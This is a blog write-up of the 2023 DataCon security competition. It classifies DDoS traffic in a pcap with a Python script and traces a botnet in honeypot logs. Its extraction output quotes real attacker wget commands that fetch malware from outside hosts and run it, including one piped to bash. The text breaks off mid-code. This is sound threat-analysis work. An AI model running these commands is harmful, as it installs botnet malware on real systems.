@@ -1,0 +1,872 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lazy_forever">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="互联网威胁溯源题目一：形形色色的DDoS分析根据题目描述，攻击者采用了多种DDoS攻击方法，找出这些攻击流量，并将攻击类型相同的源IP进行归类。 分析题目提供的流量包，wireshark打开。 观察到多种ddos流量。 SYN Flood Attack流量特征：仅有一个tcp包。   UDP Flood Attack流量特征：协议为UDP，内容杂乱。   NTP Reply Flood Attac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 DataCon大数据安全分析竞赛 WriteUp">
+<meta property="og:url" content="https://blog.lazyforever.top/2023/11/16/2023datacon/index.html">
+<meta property="og:site_name" content="lazy_forever&#39;s Blog">
+<meta property="og:description" content="互联网威胁溯源题目一：形形色色的DDoS分析根据题目描述，攻击者采用了多种DDoS攻击方法，找出这些攻击流量，并将攻击类型相同的源IP进行归类。 分析题目提供的流量包，wireshark打开。 观察到多种ddos流量。 SYN Flood Attack流量特征：仅有一个tcp包。   UDP Flood Attack流量特征：协议为UDP，内容杂乱。   NTP Reply Flood Attac">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/syn.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/udp.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/ntp.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/cc1.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/cc2.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/main.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/33F9.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/3A91.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/ptr.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/387A.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/cc1code.png">
+<meta property="og:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/cc2code.png">
+<meta property="article:published_time" content="2023-11-16T13:04:22.000Z">
+<meta property="article:modified_time" content="2023-11-17T14:26:20.717Z">
+<meta property="article:author" content="lazy_forever">
+<meta property="article:tag" content="wireshark">
+<meta property="article:tag" content="reverse">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.lazyforever.top/2023/11/16/2023datacon/syn.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2023 DataCon大数据安全分析竞赛 WriteUp - lazy_forever&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.lazyforever.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"84176b1e334c7f1956cee269aaaf9bb3","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?84176b1e334c7f1956cee269aaaf9bb3";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="lazy_forever's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lazy_forever</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023 DataCon大数据安全分析竞赛 WriteUp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        lazy_forever
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-16 21:04" pubdate>
+          2023年11月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023 DataCon大数据安全分析竞赛 WriteUp</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：16 天前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="互联网威胁溯源"><a href="#互联网威胁溯源" class="headerlink" title="互联网威胁溯源"></a>互联网威胁溯源</h2><h3 id="题目一：形形色色的DDoS"><a href="#题目一：形形色色的DDoS" class="headerlink" title="题目一：形形色色的DDoS"></a>题目一：形形色色的DDoS</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>根据题目描述，攻击者采用了多种DDoS攻击方法，找出这些攻击流量，并将攻击类型相同的源IP进行归类。</p>
+<p>分析题目提供的流量包，wireshark打开。</p>
+<p>观察到多种ddos流量。</p>
+<h5 id="SYN-Flood-Attack"><a href="#SYN-Flood-Attack" class="headerlink" title="SYN Flood Attack"></a>SYN Flood Attack</h5><p>流量特征：仅有一个tcp包。</p>
+<img src="/2023/11/16/2023datacon/syn.png" srcset="/img/loading.gif" lazyload class="">
+
+<h5 id="UDP-Flood-Attack"><a href="#UDP-Flood-Attack" class="headerlink" title="UDP Flood Attack"></a>UDP Flood Attack</h5><p>流量特征：协议为UDP，内容杂乱。</p>
+<img src="/2023/11/16/2023datacon/udp.png" srcset="/img/loading.gif" lazyload class="">
+
+<h5 id="NTP-Reply-Flood-Attack"><a href="#NTP-Reply-Flood-Attack" class="headerlink" title="NTP Reply Flood Attack"></a>NTP Reply Flood Attack</h5><p>流量特征：协议为NTP</p>
+<img src="/2023/11/16/2023datacon/ntp.png" srcset="/img/loading.gif" lazyload class="">
+
+<h5 id="CC-Attack"><a href="#CC-Attack" class="headerlink" title="CC Attack"></a>CC Attack</h5><p>流量特征：具有完整的TCP流量包。</p>
+<p>此次ddos中CC攻击有两种形式：</p>
+<h6 id="第一种（示例）"><a href="#第一种（示例）" class="headerlink" title="第一种（示例）"></a>第一种（示例）</h6><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-1278<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-591<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-452<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-815<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/16/2023datacon/cc1.png" srcset="/img/loading.gif" lazyload class="">
+
+<h6 id="第二种（示例）"><a href="#第二种（示例）" class="headerlink" title="第二种（示例）"></a>第二种（示例）</h6><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1000<br><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">256</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">968</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">236</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">808</span></span><br></code></pre></td></tr></table></figure>
+
+<img src="/2023/11/16/2023datacon/cc2.png" srcset="/img/loading.gif" lazyload class="">
+
+<h4 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h4><p>设置过滤器，编写脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>tshark=<span class="hljs-string">r&quot;C:\sec\Wireshark\tshark.exe&quot;</span> <span class="hljs-comment"># 本地tshark路径</span><br>pcap=<span class="hljs-string">&#x27;../pcap.pcapng&#x27;</span> <span class="hljs-comment"># 本地pcap位置</span><br><br><span class="hljs-comment"># 读取pcap文件并分类</span><br>udp_cap = pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;udp&#x27;</span>,tshark_path=tshark)<br>ntp_cap = pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;ntp&#x27;</span>,tshark_path=tshark)<br>tls_cap = pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;tls&#x27;</span>,tshark_path=tshark)<br>cc2_cap= pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;tcp.flags.syn==1 &amp;&amp; tcp.options&#x27;</span>, tshark_path=tshark)<br>syn_cap= pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;tcp.flags.syn==1&#x27;</span>, tshark_path=tshark)<br><br><span class="hljs-comment"># 观察到最后时间段除了一个ip以外都是cc1末流量包</span><br>cc1_cap=pyshark.FileCapture(pcap, display_filter=<span class="hljs-string">&#x27;frame.time_relative&gt;=100.053&#x27;</span>, tshark_path=tshark)<br>get_except=(<span class="hljs-string">&quot;92.126.115.64&quot;</span>)<br><br>target=(<span class="hljs-string">&#x27;93.224.28.177&#x27;</span>) <span class="hljs-comment"># 被ddos机ip</span><br><br><span class="hljs-comment"># 用于存储IP地址的集合</span><br>udp_list = <span class="hljs-built_in">set</span>()<br>ntp_list = <span class="hljs-built_in">set</span>()<br>tls_list=<span class="hljs-built_in">set</span>()<br>cc2_list=<span class="hljs-built_in">set</span>()<br>syn_list=<span class="hljs-built_in">set</span>()<br>cc1_list=<span class="hljs-built_in">set</span>()<br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> cc1_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> get_except:<br>            cc1_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> cc2_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cc1_list:<br>            cc2_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> syn_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cc2_list <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cc1_list:<br>            syn_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> tls_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>            tls_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> ntp_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>            ntp_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> udp_cap:<br>    <span class="hljs-keyword">try</span>:<br>        source_ip = packet.ip.src<br>        <span class="hljs-keyword">if</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ntp_list  <span class="hljs-keyword">and</span> source_ip <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>            udp_list.add(source_ip)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># 将IP地址导出到txt文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;q1_answer.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(udp_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(ntp_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(cc2_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(syn_list))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(cc1_list))<br></code></pre></td></tr></table></figure>
+
+<h3 id="题目二：威胁情报的关联分析"><a href="#题目二：威胁情报的关联分析" class="headerlink" title="题目二：威胁情报的关联分析"></a>题目二：威胁情报的关联分析</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><strong>题目描述</strong>：选手点击下载该题提供的文件，本文件是部分公网蜜罐日志。已知本次的DDoS攻击由僵尸网络团伙发起，该团伙传播了两种恶意样本文件。在本次攻击中，该团伙利用CVE-2019-7238漏洞组建僵尸网络。请找到这两种恶意样本文件，并给出每种恶意样本文件的MD5以及每种恶意样本文件在蜜罐日志的传播源IP和下载站IP（作答时只需给出IP即可，无需具体指定每个IP是传播源还是下载站）。</p>
+<p>下载提供的honeylog.json，观察发现，大部分传输恶意样本文件的流量均使用了wget协议来下载恶意样本，因此可以将带有wget的字符串过滤出来。</p>
+<p>根据题目描述的CVE-2019-7238，其漏洞利用路径为<code>/service/extdirect</code>，可以通过这个路径找到一个恶意样本。</p>
+<h4 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h4><p>编写提取wget字符串的脚本，脚本提取方式为识别<code>wget </code>、<code>wget+</code>或<code>wget%</code>为前缀，<code>;</code>或<code>)</code>为后缀的字符串。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">wget_lines = <span class="hljs-built_in">set</span>()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;honeylog.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        line = line.strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wget &#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;wget%&#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;wget+&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            begin_index=line.find(<span class="hljs-string">&#x27;wget&#x27;</span>)<br>            ll=[<span class="hljs-built_in">len</span>(line)]<br>            <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&#x27;;&#x27;</span>)!=-<span class="hljs-number">1</span>:<br>                ll.append(line.find(<span class="hljs-string">&#x27;;&#x27;</span>))<br>            <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&#x27;)&#x27;</span>)!=-<span class="hljs-number">1</span>:<br>                ll.append(line.find(<span class="hljs-string">&#x27;)&#x27;</span>))<br>            end_index = <span class="hljs-built_in">min</span>(ll)<br>            wget_lines.add(line[begin_index:end_index])<br><br><span class="hljs-comment"># 将满足条件的行写入2.txt</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(wget_lines))<br></code></pre></td></tr></table></figure>
+
+<p>运行脚本后，得到：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">wget http:<span class="hljs-comment">//miori.lol/miori.arm7 &amp;&amp; chmod 777 miori.arm7 &amp;&amp; ./miori.arm7 selfrep.vigor &amp;&amp; rm -rf miori.arm7</span><br>wget -g <span class="hljs-number">103.178</span>.<span class="hljs-number">232.12</span>  -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget -g <span class="hljs-number">107.173</span>.<span class="hljs-number">231.76</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//112.192.5.28:8888/koba -O /tmp/koba &amp;&amp; cd /tmp &amp;&amp; chmod +x koba &amp;&amp; ./koba &amp;&quot;&#125;&#125;</span><br>wget -g <span class="hljs-number">143.198</span>.<span class="hljs-number">91.91</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget -g <span class="hljs-number">193.233</span>.<span class="hljs-number">193.12</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r <span class="hljs-regexp">/yeye/y</span>eye.mips<br>wget -g <span class="hljs-number">103.183</span>.<span class="hljs-number">118.160</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//download.asyncfox.xyz/download/dupa2.sh -O- | bash</span><br>wget -g <span class="hljs-number">109.98</span>.<span class="hljs-number">208.52</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//46.29.166.61/arm7 &amp;&amp; chmod 777 arm7 &amp;&amp; ./arm7 selfrep.vigor &amp;&amp; rm -rf arm7</span><br>wget http:<span class="hljs-comment">//74.209.210.114:8888/caesar -O /tmp/caesar &amp;&amp; cd /tmp &amp;&amp; chmod +x caesar &amp;&amp; ./caesar &amp;</span><br>wget http:<span class="hljs-comment">//149.129.92.9:8888/caesar -O /tmp/caesar &amp;&amp; cd /tmp &amp;&amp; chmod +x caesar &amp;&amp; ./caesar &amp;</span><br>wget -g <span class="hljs-number">64.227</span>.<span class="hljs-number">121.58</span> -l <span class="hljs-regexp">/tmp/</span>.oxy -r /mips<br>wget http:<span class="hljs-comment">//45.95.146.26/miori.arm7 &amp;&amp; chmod 777 miori.arm7 &amp;&amp; ./miori.arm7 selfrep.vigor &amp;&amp; rm -rf miori.arm7</span><br></code></pre></td></tr></table></figure>
+
+<p>其中caesar，koba在大网环境中可以成功下载，使用md5sum计算样本md5值，编写脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 